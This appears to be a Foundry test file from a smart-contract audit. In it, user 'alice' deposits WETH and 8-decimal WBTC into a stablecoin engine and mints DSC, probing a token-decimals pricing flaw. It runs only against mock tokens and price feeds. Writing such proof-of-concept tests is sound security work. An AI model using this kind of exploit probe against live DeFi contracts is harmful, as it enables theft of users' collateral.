// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DeployDSC} from "../../script/DeployDSC.s.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/token/ERC20DecimalsMock.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";

contract ExploitEngine is Test {

    DSCEngine engine;
    DecentralizedStableCoin dsc;

    DeployDSC deployer;
    HelperConfig config;

    address weth;
    address wethUsdPriceFeed;
    address wbtc;
    address wbtcUsdPriceFeed;

    uint256 wethDecimals; // 18
    uint256 wbtcDecimals; // 8

    address alice = makeAddr("alice");

    uint256 private constant PRECISION = 1e18;
    uint256 private constant FEED_DECIMALS = 1e8;
    uint256 private constant MIN_HEALTH_FACTOR = 1e18;
    uint256 private constant LIQUIDATION_THRESHOLD = 50; // 200% overcollateralized
    uint256 private constant LIQUIDATION_PRECISION = 100;
    uint256 private constant ADDITIONAL_FEED_PRECISION = 1e10;  

    uint256 constant STARTING_ERC20_BALANCE = 10 ether;

    function setUp() public {
        deployer = new DeployDSC();
        (dsc, engine, config) = deployer.run();
        (wethUsdPriceFeed,wbtcUsdPriceFeed,weth,wbtc,) = config.activeNetwork();
        ERC20DecimalsMock(weth).mint(alice, STARTING_ERC20_BALANCE);
        ERC20DecimalsMock(wbtc).mint(alice, STARTING_ERC20_BALANCE);

        wethDecimals = ERC20DecimalsMock(weth).decimals();
        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();

    }

    function testExploitTokenDecimals() public {
        vm.startPrank(alice);
        uint256 amountToDeposit = 1e18; // 1 WETH
        uint256 expectedValueWeth = 2000 ether;
        uint256 amountDscFromWeth = (expectedValueWeth * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(weth).approve(address(engine), amountToDeposit);
        engine.depositCollateralAndMintDsc(weth, amountToDeposit, amountDscFromWeth); 
        // console.log(amountDscFromWeth);
        assertEq(dsc.balanceOf(alice), amountDscFromWeth);
        vm.stopPrank();

        uint256 tokenAmount = engine.getTokenAmountFromUsd(weth, expectedValueWeth);
        assertEq(tokenAmount, amountToDeposit);

        vm.startPrank(alice);
        uint256 wbtcAmountToDeposit = 1 * 10 ** wbtcDecimals;
        uint256 expectedValueWbtc = 30000 * 10 ** wbtcDecimals;
        uint256 amountDscFromWbtc = (expectedValueWbtc * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(wbtc).approve(address(engine), wbtcAmountToDeposit);

        engine.depositCollateralAndMintDsc(wbtc, wbtcAmountToDeposit, amountDscFromWbtc);

        assertEq(dsc.balanceOf(alice), amountDscFromWbtc);
        // assertEq(dsc.balanceOf(alice), amountDscFromWeth + amountDscFromWbtc);

        vm.stopPrank();

    }
}
